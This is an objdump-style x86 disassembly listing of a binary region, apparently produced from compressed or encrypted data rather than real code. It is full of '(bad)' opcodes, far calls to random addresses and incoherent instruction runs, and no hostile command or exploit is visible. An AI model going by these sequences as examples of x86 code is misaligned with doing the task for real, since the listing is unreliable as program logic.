  422cce:	retf   0x2352
  422cd1:	push   0xffffff87
  422cd3:	cmp    DWORD PTR [eax+0x6e],esp
  422cd6:	(bad)  [edi+0xf05bb5b]
  422cdc:	xor    BYTE PTR [edx+0x24891649],cl
  422ce2:	call   0xa5a8616a
  422ce7:	das    
  422ce8:	pop    es
  422ce9:	rcr    DWORD PTR [ebx],cl
  422ceb:	sahf   
  422cec:	adc    ah,0x8
  422cef:	das    
  422cf0:	arpl   WORD PTR [esi],ax
  422cf2:	cmp    BYTE PTR [ebp+0x78],0x4d
  422cf6:	iret   
  422cf7:	call   0xd7d7e3e3
  422cfc:	or     eax,0x7e70c2b2
  422d01:	cmc    
  422d02:	and    dh,BYTE PTR [eax-0x127267cc]
  422d08:	cmp    eax,0x9d9001fe
  422d0d:	jns    0x422d68
  422d0f:	retf   0x0
	...
  422d72:	add    BYTE PTR [eax],al
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ecx,DWORD PTR [esi]
  422d81:	repz cmc 
  422d83:	push   ebp
  422d84:	pop    eax
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR [ecx+eax*1],al
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	fxtract 
  422d8e:	repz mov ecx,0x1bd91dde
  422d94:	and    ah,BYTE PTR [edx+0x56796de3]
  422d9a:	in     eax,0xd8
  422d9c:	test   eax,0x64eb2f38
  422da1:	jno    0x422def
  422da3:	rcl    BYTE PTR [di+0x2969],0xa7
  422da9:	xor    DWORD PTR [ecx],eax
  422dab:	xor    esp,DWORD PTR [esi]
  422dad:	ret    
  422dae:	lods   al,BYTE PTR ds:[esi]
  422daf:	jp     0x422d83
  422db1:	xchg   ebx,eax
  422db2:	cmp    BYTE PTR [ecx-0x66],bh
  422db5:	xor    ah,dh
  422db7:	jge    0x422de8
  422db9:	add    al,0x31
  422dbb:	xor    eax,DWORD PTR [esi+0x5a69a163]
  422dc1:	mov    edi,0x5a9eb809
  422dc6:	leave  
  422dc7:	into   
  422dc8:	bound  esi,QWORD PTR [eax-0x5b090a83]
  422dce:	movsx  edi,WORD PTR [ebp+0x25]
  422dd2:	mov    ch,0x36
  422dd4:	dec    ebx
  422dd5:	jne    0x422e15
  422dd7:	mov    cl,0x8e
  422dd9:	cmp    eax,0xa7bf25a4
  422dde:	and    DWORD PTR [esi-0x789bb84b],edx
  422de4:	test   BYTE PTR [esi+0x45cee19a],dl
  422dea:	jbe    0x422e0d
  422dec:	sub    BYTE PTR [edi-0x1f],0xf8
  422df0:	jecxz  0x422d7b
  422df2:	or     al,0x4e
  422df4:	mov    ch,0x48
  422df6:	cmp    edx,0xb
  422df9:	nop
  422dfa:	icebp  
  422dfb:	nop
  422dfc:	push   eax
  422dfd:	stos   BYTE PTR es:[edi],al
  422dfe:	fcom   DWORD PTR [edi]
  422e00:	das    
  422e01:	pop    ss
  422e02:	jb     0x422d9e
  422e04:	push   esp
  422e05:	xchg   edi,eax
  422e06:	jp     0x422e0a
  422e08:	fldenv [edi]
  422e0a:	(bad)
  422e0d:	pop    edx
  422e0e:	test   al,0x9
  422e10:	ret    
  422e11:	push   es
  422e12:	jl     0x422dfb
  422e14:	pop    ebp
  422e15:	cdq    
  422e16:	sbb    eax,0x733d3f4e
  422e1b:	xlat   BYTE PTR ds:[ebx]
  422e1c:	scas   al,BYTE PTR es:[edi]
  422e1d:	jg     0x422dfe
  422e1f:	iret   
  422e20:	std    
  422e21:	fistp  QWORD PTR [ebx-0x4c8501b6]
  422e27:	popf   
  422e28:	pop    ss
  422e29:	mov    edi,0xf7390792
  422e2e:	and    BYTE PTR [ebx-0x20],dh
  422e31:	xchg   esp,eax
  422e32:	push   ebp
  422e33:	neg    DWORD PTR [edx-0x61bef32]
  422e39:	lss    eax,FWORD PTR [edi+0x1a]
  422e3d:	pop    eax
  422e3e:	mov    al,ds:0x7a6996d8
  422e43:	cwde   
  422e44:	add    eax,0xcbcfd3bd
  422e49:	xor    ah,dl
  422e4b:	in     al,dx
  422e4c:	scas   al,BYTE PTR es:[edi]
  422e4d:	and    esp,DWORD PTR [edi]
  422e4f:	jmp    0x422e29
  422e51:	mov    bh,0x88
  422e53:	xchg   esi,eax
  422e54:	and    ah,BYTE PTR [ecx+0x686c65df]
  422e5a:	ja     0x422df2
  422e5c:	retf   0xb551
  422e5f:	dec    edx
  422e60:	sti    
  422e61:	mov    eax,ds:0x341046df
  422e66:	gs push ebp
  422e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e69:	jb     0x422dec
  422e6b:	ja     0x422e6a
  422e6d:	dec    esp
  422e6e:	cmp    eax,DWORD PTR [ebp-0x3dc06ce6]
  422e74:	pop    edi
  422e75:	push   ebp
  422e76:	xor    esp,ebx
  422e78:	add    DWORD PTR [ecx+0x3b],edi
  422e7b:	ins    BYTE PTR es:[edi],dx
  422e7c:	sbb    edi,ebp
  422e7e:	mov    es,WORD PTR [ebp+0xdf5917]
  422e84:	retf   0xcd55
  422e87:	std    
  422e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e89:	inc    ebx
  422e8a:	gs out 0x50,al
  422e8d:	cli    
  422e8e:	sub    al,0xa7
	...
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0x5015ca33
  422f02:	ret    0x5cc6
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR [ecx+eax*1],al
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	popf   
  422f0d:	sbb    bl,al
  422f0f:	in     eax,0x77
  422f11:	mov    dh,0x22
  422f13:	sub    dh,BYTE PTR ds:0x646d3cf9
  422f19:	scas   eax,DWORD PTR es:[edi]
  422f1a:	aaa    
  422f1b:	sub    bl,BYTE PTR [edx-0x3e]
  422f1e:	or     ebp,DWORD PTR [esi+eax*1-0x3301f00]
  422f25:	cmp    al,0xec
  422f27:	xor    eax,0x52ba0a6a
  422f2c:	xchg   DWORD PTR [ebp+0x3f],ebp
  422f2f:	jns    0x422f8d
  422f31:	sar    bl,1
  422f33:	(bad)  
  422f34:	mov    eax,ds:0x33f14421
  422f39:	(bad)  
  422f3a:	xlat   BYTE PTR ds:[ebx]
  422f3b:	call   0x3fcc:0xcc89eaac
  422f42:	mov    WORD PTR [edi-0x14bf2cd4],fs
  422f48:	mov    eax,0x2a3556b2
  422f4d:	and    edi,DWORD PTR [esi-0x48]
  422f50:	add    ebx,DWORD PTR [ebx+0x1790b5c]
  422f56:	push   ecx
  422f57:	cli    
  422f58:	sub    eax,DWORD PTR [edx]
  422f5a:	pop    ebp
  422f5b:	leave  
  422f5c:	(bad)  
  422f5d:	jb     0x422f5f
  422f5f:	pop    ecx
  422f60:	lea    esi,[ebp+0x63]
  422f63:	fiadd  WORD PTR [eax+0x56db311c]
  422f69:	sbb    ch,dl
  422f6b:	out    0xb4,eax
  422f6d:	pop    ebx
  422f6e:	retf   
  422f6f:	xor    al,0xfa
  422f71:	xchg   bl,bh
  422f73:	add    DWORD PTR [esi],ebx
  422f75:	icebp  
  422f76:	and    BYTE PTR [ebp+0x5ed54fdc],ah
  422f7c:	push   ecx
  422f7d:	jl     0x422fa5
  422f7f:	(bad)  
  422f80:	mov    dh,0xfb
  422f82:	push   esi
  422f83:	and    BYTE PTR [edx+eax*4+0x2c873857],ch
  422f8a:	in     eax,dx
  422f8b:	shr    BYTE PTR [ebx],1
  422f8d:	test   BYTE PTR [ecx*8+0xe84a2f7],bh
  422f94:	cli    
  422f95:	sbb    BYTE PTR [eax-0x17],al
  422f98:	dec    ecx
  422f99:	xor    al,0x36
  422f9b:	adc    eax,0x3c8344e3
  422fa0:	jl     0x422ffe
  422fa2:	mov    esi,?
  422fa4:	push   esi
  422fa5:	jnp    0x422ffb
  422fa7:	les    ebx,FWORD PTR [edx-0x103a44c5]
  422fad:	mov    BYTE PTR [edi],ah
  422faf:	ret    
  422fb0:	js     0x422f8a
  422fb2:	js     0x422f80
  422fb4:	or     DWORD PTR [ebx-0x20915de1],ebx
  422fba:	imul   ecx,DWORD PTR [edx],0x5b07f2ba
  422fc0:	adc    eax,0x89eea83
  422fc5:	fadd   st,st(1)
  422fc7:	mov    ebp,0xb91768d0
  422fcc:	ins    DWORD PTR es:[edi],dx
  422fcd:	inc    dx
  422fcf:	sar    DWORD PTR [edi-0x3f],0x76
  422fd3:	fistp  QWORD PTR [esi-0x69]
  422fd6:	xor    BYTE PTR [ebx+edi*8-0x4e18feaa],ah
  422fdd:	in     eax,0xdb
  422fdf:	fdiv   st,st(6)
  422fe1:	clc    
  422fe2:	dec    eax
  422fe3:	xchg   edi,eax
  422fe4:	sub    ch,dl
  422fe6:	xchg   BYTE PTR [edx],al
  422fe8:	jecxz  0x422fba
  422fea:	stc    
  422feb:	pop    esi
  422fec:	inc    ebp
  422fed:	mov    bl,0x11
  422fef:	and    al,BYTE PTR [edx+0x17]
  422ff2:	jecxz  0x423015
  422ff4:	pop    ebp
  422ff5:	pushf  
  422ff6:	test   eax,0x4f506975
  422ffb:	push   es
  422ffc:	out    0x3e,al
  422ffe:	nop
  422fff:	cwde   
  423000:	push   ebx
  423001:	adc    DWORD PTR [eax],edi
  423003:	add    dh,al
  423005:	dec    BYTE PTR [eax+eax*8]
  423008:	adc    al,0x56
  42300a:	sub    DWORD PTR [ebp-0x19],esi
  42300d:	sar    dh,cl
  42300f:	cmp    al,0x0
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ecx+ebx*1+0x60213a4c],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	lods   eax,DWORD PTR ds:[esi]
  42308d:	jmp    FWORD PTR [ebp-0x2d]
  423090:	fist   WORD PTR [eax+0x20266f32]
  423096:	fcomp  DWORD PTR [edi]
  423098:	fist   WORD PTR [eax-0x337a9b40]
  42309e:	add    eax,0x6517377c
  4230a3:	test   BYTE PTR [edx],ah
  4230a5:	mov    ds:0xa9e4bfa9,al
  4230aa:	(bad)  
  4230ab:	cmp    ecx,DWORD PTR [edx+0x28f04068]
  4230b1:	or     DWORD PTR [ebp+0x45369704],esp
  4230b7:	xchg   ecx,eax
  4230b8:	sbb    cl,ah
  4230ba:	pop    esi
  4230bb:	int    0x64
  4230bd:	push   edx
  4230be:	icebp  
  4230bf:	dec    ebp
  4230c0:	imul   edi,DWORD PTR [eax]
  4230c3:	sub    ebp,ebx
  4230c5:	in     eax,0x72
  4230c7:	xchg   ecx,eax
  4230c8:	sbb    esp,DWORD PTR [edx-0x67]
  4230cb:	dec    edx
  4230cc:	xor    BYTE PTR [ecx+0x70060a06],ch
  4230d2:	cmp    ecx,DWORD PTR [edx-0x76]
  4230d5:	call   0x5f1a:0xb5a6964a
  4230dc:	jmp    0xd1b46ef7
  4230e1:	je     0x42313b
  4230e3:	pop    edx
  4230e4:	push   cs
  4230e5:	push   ebp
  4230e6:	and    edx,ebp
  4230e8:	frstor [eax]
  4230ea:	aaa    
  4230eb:	add    ebx,DWORD PTR [edx+ebp*2-0x152a6434]
  4230f2:	fisubr DWORD PTR [eax+0x15]
  4230f5:	out    0x1d,al
  4230f7:	mov    edi,0xad6e5e3e
  4230fc:	inc    eax
  4230fd:	and    eax,0x9f034550
  423102:	dec    eax
  423103:	clc    
  423104:	cs int 0x38
  423107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423108:	out    dx,eax
  423109:	push   0x1abfbbca
  42310e:	lods   eax,DWORD PTR ds:[esi]
  42310f:	test   ecx,0xd19f2cea
  423115:	stos   DWORD PTR es:[edi],eax
  423116:	ret    0xcf97
  423119:	adc    al,0x81
  42311b:	aas    
  42311c:	js     0x423184
  42311e:	imul   edx,DWORD PTR [esi-0x365feb1c],0x88f47a71
  423128:	push   0xfffffff9
  42312a:	outs   dx,BYTE PTR ds:[esi]
  42312b:	js     0x4230ca
  42312d:	pop    eax
  42312e:	xor    bl,BYTE PTR [eax-0x6cfb6c05]
  423134:	stos   BYTE PTR es:[edi],al
  423135:	jl     0x4230ca
  423137:	iret   
  423138:	in     al,0x84
  42313a:	repz xlat BYTE PTR ds:[ebx]
  42313c:	jge    0x423162
  42313e:	(bad)  
  42313f:	dec    al
  423141:	mov    esi,0xdeeb4ed8
  423146:	xchg   BYTE PTR [eax],dl
  423148:	sbb    ebx,DWORD PTR [esi-0x6a964ec5]
  42314e:	push   ebp
  42314f:	pop    ebx
  423150:	outs   dx,BYTE PTR ds:[esi]
  423151:	jb     0x4230e9
  423153:	das    
  423154:	repz daa 
  423156:	or     eax,0xcba22ad1
  42315b:	sub    al,dh
  42315d:	mov    ecx,0x79987bff
  423162:	loopne 0x4230f1
  423164:	(bad)  
  423165:	repz xor ebp,DWORD PTR [ecx+0x275953b9]
  42316c:	adc    esp,DWORD PTR [esp+edi*8]
  42316f:	inc    ecx
  423170:	dec    bx
  423172:	inc    ebx
  423173:	push   0xffffffa5
  423175:	clc    
  423176:	lds    ebx,FWORD PTR [edi-0x18]
  423179:	inc    edx
  42317a:	sub    BYTE PTR [edi],bh
  42317c:	dec    edx
  42317d:	or     al,0xdd
  42317f:	add    ecx,edx
  423181:	fsub   st(0),st
  423183:	xchg   esp,eax
  423184:	in     eax,dx
  423185:	ja     0x4231bb
  423187:	idiv   DWORD PTR [ebx-0x75]
  42318a:	sbb    edx,eax
  42318c:	lea    edi,[edi*2+0x98]
	...
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x71fe9cff],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	pop    esp
  42320d:	inc    edx
  42320e:	addr16 jae 0x423272
  423211:	jne    0x4231f4
  423213:	retf   
  423214:	lahf   
  423215:	int    0x9f
  423217:	lea    esi,[edi+0x58]
  42321a:	shr    DWORD PTR [ecx],0x25
  42321d:	aas    
  42321e:	loopne 0x4231b1
  423220:	push   cs
  423221:	xlat   BYTE PTR ds:[ebx]
  423222:	pop    esi
  423223:	jp     0x4231c0
  423225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423226:	mov    ecx,0xb3306c04
  42322b:	(bad)  
  42322d:	rcl    DWORD PTR [esi-0x6],cl
  423230:	stos   BYTE PTR es:[edi],al
  423231:	adc    DWORD PTR [ebx-0x51],esi
  423234:	lock inc ebx
  423236:	shl    ecx,1
  423238:	cdq    
  423239:	std    
  42323a:	and    ebx,ebp
  42323c:	es mov ebp,0x9273313b
  423242:	dec    ebx
  423243:	sub    eax,0xbacc42d5
  423248:	je     0x4232b2
  42324a:	push   esi
  42324b:	mov    esp,0x55c7ef7b
  423250:	jg     0x423243
  423252:	ret    
  423253:	jmp    0x4232b1
  423255:	mov    al,ds:0xf5c37cdf
  42325a:	mov    esp,edi
  42325c:	adc    ch,bh
  42325e:	out    dx,al
  42325f:	lods   eax,DWORD PTR ds:[esi]
  423260:	pop    esp
  423261:	cdq    
  423262:	add    cl,BYTE PTR [edx]
  423264:	xor    eax,0x77153cc1
  423269:	jo     0x423236
  42326b:	sub    eax,0x139f1ce1
  423270:	in     eax,0x67
  423272:	icebp  
  423273:	mov    edi,DWORD PTR [ebx-0x162a379d]
  423279:	imul   ecx,DWORD PTR [ebx-0x6d],0xb29d29fa
  423280:	xchg   esi,eax
  423281:	mov    esp,0x87ecb757
  423286:	mov    eax,ds:0x48b4b169
  42328b:	loop   0x4232c7
  42328d:	push   ecx
  42328e:	ret    
  42328f:	add    al,0x16
  423291:	sub    BYTE PTR [esi],al
  423293:	into   
  423294:	adc    eax,0x6d0c2883
  423299:	inc    esp
  42329a:	test   eax,0xf8b7f835
  42329f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232a0:	pop    ebx
  4232a1:	cwde   
  4232a2:	mov    DWORD PTR [edx+0x29],ecx
  4232a5:	stc    
  4232a6:	dec    esp
  4232a7:	sub    bl,al
  4232a9:	or     DWORD PTR [ecx+edi*1],esi
  4232ac:	mov    ebp,0x4c785f0d
  4232b1:	pop    cx
  4232b3:	inc    ebx
  4232b4:	xchg   ebp,eax
  4232b5:	dec    edi
  4232b6:	jge    0x423289
  4232b8:	mov    cl,dl
  4232ba:	bound  esp,QWORD PTR [edx]
  4232bc:	test   al,0xbb
  4232be:	pusha  
  4232bf:	jecxz  0x42327e
  4232c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232c2:	cdq    
  4232c3:	call   0x84e7173a
  4232c8:	add    ebp,esp
  4232ca:	or     eax,0xc6fa7b11
  4232cf:	aas    
  4232d0:	mov    ecx,0x72009f24
  4232d5:	inc    esi
  4232d6:	dec    ebp
  4232d7:	mov    esi,0x92062575
  4232dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232dd:	xor    BYTE PTR [esi+ecx*2+0x56480007],ah
  4232e4:	mov    bh,0xab
  4232e6:	nop
  4232e7:	repz add ebx,0xffffff87
  4232eb:	inc    ecx
  4232ec:	cmp    ch,BYTE PTR [eax-0x34a07767]
  4232f2:	aaa    
  4232f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232f4:	pusha  
  4232f5:	lahf   
  4232f6:	shl    DWORD PTR [edx-0x1badfb24],1
  4232fc:	mov    ds:0x5d30d1f6,al
  423301:	jp     0x4232bf
  423303:	push   ds
  423304:	xchg   esp,eax
  423305:	fidivr DWORD PTR [edi-0x1e81bf4b]
  42330b:	lods   eax,DWORD PTR ds:[esi]
  42330c:	mov    al,0x58
  42330e:	pop    es
  42330f:	adc    DWORD PTR [eax],eax
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x9f1a0f44
  423382:	jo     0x4233be
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    BYTE PTR [ebx],ch
  42338d:	bound  eax,QWORD PTR [edx+0x4414c867]
  423393:	dec    ebp
  423394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423395:	bnd js 0x42340a
  423398:	fisub  DWORD PTR [edi+0x50]
  42339b:	push   edi
  42339c:	mov    eax,ds:0x6602b190
  4233a1:	add    DWORD PTR [esi-0x561bf7e4],esp
  4233a7:	push   edx
  4233a8:	and    eax,0x301ea121
  4233ad:	mov    ah,0x8d
  4233af:	mov    bl,dl
  4233b1:	dec    eax
  4233b2:	pop    ss
  4233b3:	lds    ebx,FWORD PTR [ecx-0x78cc6cef]
  4233b9:	dec    ebp
  4233ba:	and    al,0x26
  4233bc:	ins    BYTE PTR es:[edi],dx
  4233bd:	mov    al,0x69
  4233bf:	retf   0x8b68
  4233c2:	test   eax,0xcfc5262a
  4233c7:	icebp  
  4233c8:	xchg   edx,eax
  4233c9:	ss in  eax,0xd0
  4233cc:	rcr    dh,0xdf
  4233cf:	cmp    DWORD PTR [edi-0xb],esp
  4233d2:	shl    DWORD PTR [eax+0x10],1
  4233d5:	cmp    al,0x32
  4233d7:	add    eax,0x41096f6f
  4233dc:	push   esi
  4233dd:	sar    bh,cl
  4233df:	push   eax
  4233e0:	mov    BYTE PTR [edx-0xadf15f5],ch
  4233e6:	adc    cl,dh
  4233e8:	idiv   DWORD PTR [esi+0x34e71427]
  4233ee:	and    BYTE PTR [eax+0x5769c5fe],bh
  4233f4:	jmp    0xce6:0xa6dde928
  4233fb:	and    BYTE PTR [ebx+0x1a],cl
  4233fe:	jl     0x423384
  423400:	pop    ds
  423401:	xor    eax,0xb9b7a7d1
  423406:	adc    DWORD PTR [ecx+0x6c],ebp
  423409:	xchg   edx,eax
  42340a:	out    dx,al
  42340b:	jnp    0x423396
  42340d:	call   0x9d6b:0xcb856c8a
  423414:	jno    0x423398
  423416:	mov    cl,0x86
  423418:	dec    edi
  423419:	mov    edi,0x8b54c7b4
  42341e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42341f:	aad    0x70
  423421:	pop    ebx
  423422:	mov    ebp,0xd10d90db
  423427:	repz dec ebp
  423429:	dec    edx
  42342a:	loopne 0x423461
  42342c:	sar    cl,1
  42342e:	enter  0x3f5d,0x59
  423432:	(bad)  [eax-0x23]
  423435:	pop    ebx
  423436:	jl     0x4234ae
  423438:	jb     0x423484
  42343a:	or     ebp,ebx
  42343c:	jge    0x4234a8
  42343e:	xor    ebp,DWORD PTR [edx+eiz*2-0x7a]
  423442:	adc    dh,BYTE PTR [eax]
  423444:	mov    edi,0x91ee8aa7
  423449:	mov    cl,0xc6
  42344b:	or     eax,DWORD PTR [esi]
  42344d:	pop    esi
  42344e:	jmp    0x4233ee
  423450:	push   edi
  423451:	les    ecx,FWORD PTR [esp+edi*2-0x79fc0b9d]
  423458:	pop    esp
  423459:	jl     0x4234b0
  42345b:	inc    eax
  42345c:	aam    0xd1
  42345e:	and    al,0x10
  423460:	bound  ebp,QWORD PTR ds:0x6ddd7838
  423466:	cld    
  423467:	fsubr  QWORD PTR [edx-0x5af26368]
  42346d:	ds push esp
  42346f:	sbb    edx,DWORD PTR [esi+0x0]
  423472:	pop    esi
  423473:	push   ebx
  423474:	loope  0x423499
  423476:	and    bh,BYTE PTR [ecx]
  423478:	aaa    
  423479:	inc    esi
  42347a:	jbe    0x423423
  42347c:	pusha  
  42347d:	sub    dl,BYTE PTR [ebp+0x6]
  423480:	imul   ebx,ebp,0x5ab109df
  423486:	fwait
  423487:	pop    edi
  423488:	scas   eax,DWORD PTR es:[edi]
  423489:	push   edx
  42348a:	lods   al,BYTE PTR ds:[esi]
  42348b:	push   ebp
  42348c:	jle    0x4234df
  42348e:	pop    edi
  42348f:	mov    eax,DWORD PTR [eax]
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0xd11f:0xadf467bf
  423501:	les    esi,FWORD PTR [ebx+eiz*1+0x1786c]
  423508:	add    al,0x1
  42350a:	add    BYTE PTR [eax],al
  42350c:	bnd jbe 0x42354f
  42350f:	inc    esi
  423510:	in     eax,dx
  423511:	popa   
  423512:	mov    DWORD PTR [ebx+0x20],edi
  423515:	dec    ecx
  423516:	sub    al,0x76
  423518:	pop    es
  423519:	sbb    al,BYTE PTR [ecx+0x7d]
  42351c:	sub    al,0xd6
  42351e:	add    dh,BYTE PTR ds:0x9247bcc4
  423524:	add    edx,edx
  423526:	add    edx,0xc40bfd0a
  42352c:	into   
  42352d:	fdivr  st(6),st
  42352f:	fcmove st,st(1)
  423531:	xchg   esp,eax
  423532:	shl    BYTE PTR [eax+esi*1-0x16],cl
  423536:	mov    eax,es:0x57e6b931
  42353c:	pop    eax
  42353d:	jle    0x42355f
  42353f:	jle    0x4234f1
  423541:	sbb    esi,DWORD PTR [ebp-0x69]
  423544:	addr16 cli 
  423546:	sub    al,0x12
  423548:	push   0x5ab2dbda
  42354d:	dec    ebx
  42354e:	xchg   esp,eax
  42354f:	je     0x423579
  423551:	cmc    
  423552:	add    DWORD PTR [esi],ebp
  423554:	jo     0x42353d
  423556:	sbb    eax,DWORD PTR [ebp-0x18e1f4aa]
  42355c:	dec    edx
  42355d:	mov    esi,ebx
  42355f:	gs lock int 0x8b
  423563:	int    0x14
  423565:	cmp    al,0x75
  423567:	cmp    BYTE PTR [ebp-0x3e860f40],ah
  42356d:	push   ebp
  42356e:	sbb    DWORD PTR cs:[ebx+0x1637ee29],eax
  423575:	pop    edx
  423576:	jae    0x423526
  423578:	adc    al,0xa9
  42357a:	push   ds
  42357b:	sub    eax,0xb10fab86
  423580:	cdq    
  423581:	fidiv  DWORD PTR [edx+edx*4]
  423584:	xor    al,bl
  423586:	std    
  423587:	in     eax,dx
  423588:	push   ds
  423589:	aad    0x34
  42358b:	repz mov dl,0x9a
  42358e:	jmp    0x565e59bc
  423593:	outs   dx,BYTE PTR ds:[esi]
  423594:	sbb    ebp,DWORD PTR [esi+0x13]
  423597:	hlt    
  423598:	lods   al,BYTE PTR ds:[esi]
  423599:	lahf   
  42359a:	mov    ds:0xf4f5fca3,eax
  42359f:	pop    ebx
  4235a0:	push   es
  4235a1:	ror    dl,cl
  4235a3:	jo     0x423605
  4235a5:	aas    
  4235a6:	dec    edx
  4235a7:	add    dl,ah
  4235a9:	imul   ebp,DWORD PTR [esi+0x8],0xffffffad
  4235ad:	pop    edi
  4235ae:	dec    esi
  4235af:	pop    ebx
  4235b0:	leave  
  4235b1:	xchg   BYTE PTR [eax-0x7b],bl
  4235b4:	stos   DWORD PTR es:[edi],eax
  4235b5:	mov    ds:0x9ef6db7f,eax
  4235ba:	xor    BYTE PTR [esi],cl
  4235bc:	mov    eax,ds:0x477051c7
  4235c1:	cmp    al,0x29
  4235c3:	mov    al,ds:0xed514d8b
  4235c8:	call   0x2eb7:0xa8996def
  4235cf:	pop    DWORD PTR [eax+esi*1-0x6c]
  4235d3:	push   0x27cd8647
  4235d8:	ja     0x4235a5
  4235da:	and    al,0x86
  4235dc:	ds pusha 
  4235de:	adc    eax,0x51c5daea
  4235e3:	mov    edi,fs
  4235e5:	pusha  
  4235e6:	test   eax,0xe8df8ec6
  4235eb:	imul   esi,DWORD PTR ds:0xe95117a6,0x1c93aa87
  4235f5:	jne    0x423674
  4235f7:	cdq    
  4235f8:	jmp    0x731e:0xe7b5eb30
  4235ff:	adc    al,0x82
  423601:	pop    DWORD PTR [ebx]
  423603:	pusha  
  423604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423605:	sub    DWORD PTR [edx],esp
  423607:	(bad)
  42360a:	push   eax
  42360b:	daa    
  42360c:	(bad)  
  42360d:	outs   dx,BYTE PTR ds:[esi]
  42360e:	(bad)  
  42360f:	cwde   
	...
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	out    0x56,al
  423682:	scas   eax,DWORD PTR es:[edi]
  423683:	jl     0x4236f5
  423685:	jns    0x423688
  423687:	add    BYTE PTR [ecx+eax*1],al
  42368a:	add    BYTE PTR [eax],al
  42368c:	out    dx,al
  42368d:	mov    eax,ds:0x5ff0b5e5
  423692:	sbb    DWORD PTR [ecx-0x14],ebx
  423695:	push   ebx
  423696:	lahf   
  423697:	ror    edi,cl
  423699:	cld    
  42369a:	cmp    al,0xc0
  42369c:	xchg   edi,eax
  42369d:	std    
  42369e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42369f:	inc    esp
  4236a0:	and    al,0xa1
  4236a2:	jge    0x42370b
  4236a4:	pop    ebp
  4236a5:	repnz adc eax,0xdb6eaa33
  4236ab:	xor    BYTE PTR [edi],bl
  4236ad:	mov    BYTE PTR [eax-0x74e2759e],cl
  4236b3:	idiv   dh
  4236b5:	mov    BYTE PTR [ecx],bl
  4236b7:	rcl    DWORD PTR [eax],1
  4236b9:	mov    ecx,0x5e2f727e
  4236be:	xchg   esi,eax
  4236bf:	test   edx,edi
  4236c1:	outs   dx,BYTE PTR ds:[esi]
  4236c2:	pop    esp
  4236c3:	lea    esi,[eax+0x43]
  4236c6:	sbb    eax,0x54ebab4a
  4236cb:	mov    cl,0xc6
  4236cd:	out    0xec,al
  4236cf:	dec    ebp
  4236d0:	xchg   edi,eax
  4236d1:	or     ebp,DWORD PTR [edi]
  4236d3:	js     0x423722
  4236d5:	stos   BYTE PTR es:[edi],al
  4236d6:	je     0x42372e
  4236d8:	cmp    al,dh
  4236da:	mov    ebx,0xe17183e9
  4236df:	cld    
  4236e0:	or     DWORD PTR [ebx+0x1e],0xffffffc6
  4236e4:	sub    BYTE PTR [edi+0x29],cl
  4236e7:	xor    eax,DWORD PTR [edx-0x17]
  4236ea:	lods   al,BYTE PTR ds:[esi]
  4236eb:	xor    al,0x92
  4236ed:	and    BYTE PTR [ebx-0x3b8bbdf8],al
  4236f3:	packssdw mm3,mm6
  4236f6:	mov    ebp,0x7cc45789
  4236fb:	out    dx,al
  4236fc:	jecxz  0x423778
  4236fe:	pusha  
  4236ff:	mov    ebp,0x37cde0f0
  423704:	sub    DWORD PTR [edi-0x60399720],ecx
  42370a:	push   ds
  42370b:	int    0x81
  42370d:	dec    ebp
  42370e:	(bad)  
  423710:	jno    0x423717
  423712:	mov    ah,0x21
  423714:	cmp    ch,BYTE PTR [eax+0x6d656331]
  42371a:	sahf   
  42371b:	add    DWORD PTR [edi-0x77da4394],esi
  423721:	addr16 popa 
  423723:	inc    esp
  423724:	shr    BYTE PTR ds:0x3aedc41d,1
  42372a:	jge    0x42370a
  42372c:	mov    dh,0xad
  42372e:	popf   
  42372f:	mov    bh,0xc9
  423731:	jge    0x423769
  423733:	inc    edx
  423734:	test   al,0xc4
  423736:	ret    0x9b8c
  423739:	inc    ebx
  42373a:	adc    al,0x5c
  42373c:	cs or  al,0x7c
  42373f:	cli    
  423740:	jbe    0x4237b3
  423742:	add    eax,0xd5a25a9e
  423747:	dec    ecx
  423748:	or     DWORD PTR [ecx-0x42],0x2
  42374c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42374d:	xor    DWORD PTR [ebp-0x52],ecx
  423750:	dec    esp
  423751:	in     al,0x2f
